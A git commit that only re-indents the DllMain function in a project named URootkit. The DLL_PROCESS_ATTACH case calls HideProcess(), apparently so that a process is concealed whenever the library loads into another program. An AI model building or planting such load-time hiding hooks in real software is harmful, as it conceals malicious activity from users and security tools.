c6e67327bc52aa2a13605f14148e53da2ea35506
V2 <60795188+ZeroMemoryEx@users.noreply.github.com>
2022-09-06 15:20:27 +0100

    Update dllmain.cpp

--- URootkit/dllmain.cpp
+++ URootkit/dllmain.cpp
@@ -83,12 +83,12 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 {
 	switch (ul_reason_for_call)
 	{
-	case DLL_PROCESS_ATTACH:
-		HideProcess();
-	case DLL_THREAD_ATTACH:
-	case DLL_THREAD_DETACH:
-	case DLL_PROCESS_DETACH:
-		break;
+		case DLL_PROCESS_ATTACH:
+			HideProcess();
+		case DLL_THREAD_ATTACH:
+		case DLL_THREAD_DETACH:
+		case DLL_PROCESS_DETACH:
+			break;
 	}
 	return TRUE;
 }
